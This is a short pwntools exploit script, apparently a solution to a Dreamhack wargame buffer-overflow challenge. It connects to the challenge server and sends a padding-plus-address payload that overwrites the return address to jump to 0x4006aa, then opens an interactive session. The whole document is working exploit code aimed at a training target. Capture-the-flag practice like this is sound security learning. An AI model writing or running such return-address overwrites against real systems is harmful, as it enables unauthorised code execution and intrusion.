# https://dreamhack.io/wargame/challenges/351

from pwn import *

context.log_level = 'debug'

#p = process('./rao')
p = remote('host3.dreamhack.games', 14752)

p.recvuntil(b'Input: ')
p.sendline(b'A' * 0x28 + b'\x00' * 16 + p64(0x4006aa))

p.interactive()